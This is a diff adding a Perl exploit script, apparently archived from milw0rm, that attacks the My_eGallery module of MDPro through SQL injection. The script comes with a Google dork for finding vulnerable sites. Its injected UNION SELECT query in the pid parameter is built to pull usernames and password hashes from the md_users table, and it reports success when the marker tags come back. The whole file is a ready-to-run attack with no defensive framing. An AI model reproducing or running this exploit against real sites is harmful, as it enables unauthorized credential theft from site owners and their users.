@@ -1,0 +1,69 @@
+#!/usr/bin/perl
+
+<<read;
+
+    MDPro Module My_eGallery Remote SQL Injection Exploit
+    by s3rg3770 && yeat - staker[at]hotmail[dot]it
+    
+    dork: inurl:module=My_eGallery pid
+    note: works regardless of php.ini settings.
+    
+read
+
+use IO::Socket;
+
+
+my ($host,$path,$id) = @ARGV;
+
+
+if (@ARGV != 3) 
+{
+       print "\n+-------------------------------------------------------+\n".
+             "\r| MDPro Module My_eGallery Remote SQL Injection Exploit |\n".
+             "\r+-------------------------------------------------------+\n".
+             "\rby yeat - staker[at]hotmail[dot]it\n".
+             "\nUsage: perl $0 host /path/ id\n".
+             "\nhost: localhost\n".
+             "\rpath: /mdpro/\n".
+             "\rid: 2\n";
+       exit;
+}         
+else
+{      
+       my ($packet,$inject,$content);
+       
+       $inject = "index.php?module=My_eGallery&do=showpic&pid=-1".
+                 "/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0".
+                 ",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7".
+                 "230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0".
+                 ",0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"; 
+                 
+       $socket = new IO::Socket::INET(
+                                       PeerAddr => $host,
+                                       PeerPort => 80,
+                                       Proto    => 'tcp'
+                                     ) or die $!;
+                                        
+       
+       $packet .= "GET /$inject HTTP/1.1\r\n";
+       $packet .= "Host: $host\r\n";
+       $packet .= "User-Agent: Lynx (textmode)\r\n";
+       $packet .= "Connection: close\r\n\r\n";
+       
+       $socket->send($packet);
+       
+       while (<$socket>) {
+          $content .= $_;
+       }
+       
+       close($socket);
+       
+       if ($content =~ /<r0x>(.+?)<r0x>/i) {
+          print "Exploit Successful: $1\n";
+       }
+       else {
+          print "Exploit Failed.\n";
+       }      
+}       
+
+# milw0rm.com [2009-02-23]
